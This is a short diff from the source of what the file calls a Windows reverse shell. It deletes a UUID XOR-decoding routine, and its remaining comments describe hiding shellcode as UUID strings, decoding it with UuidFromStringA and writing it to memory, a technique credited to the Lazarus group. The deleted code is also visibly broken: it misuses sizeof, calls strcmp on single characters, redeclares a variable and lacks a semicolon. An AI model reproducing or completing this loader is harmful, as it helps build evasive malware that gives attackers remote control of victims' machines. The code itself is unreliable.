@@ -28,20 +28,7 @@ Windows reverse shell
 using namespace std;
 
 
-// example uuid value: "a74453cd-fff0-65d2-48d154b2fe4d5c3a4"
-//					   68656c6c-6f77-6f72-6c64-313233343536
-char* dec_uuids(char* data, RPC_CSTR key) {
-	int len = sizeof(data[0]);
-	int elements = sizeof data / len;
-	char* key = *data; // key = first uuid value in data array
-	char* callcode = *(data + 1); //callcode = second uuid value in data array
-	for (int i = 1; i < elements; i++) {
-		for (int j = 0; j < len; j++) {
-			(data + i)[j] = (strcmp((data + i)[j], '-') == 0) ? '-' : (data + i)[j] ^ key[j];
-		}
-	}
-	return data
-}
+
 // decrypt data using UuidFromStringA to decode data and write shellcode to memory (idea from Lazarus group)
 // first UUID=XOR key | second UUID=XOR'd command code | third-last UUID=command call / shellcode
 // data is an array of uuids.
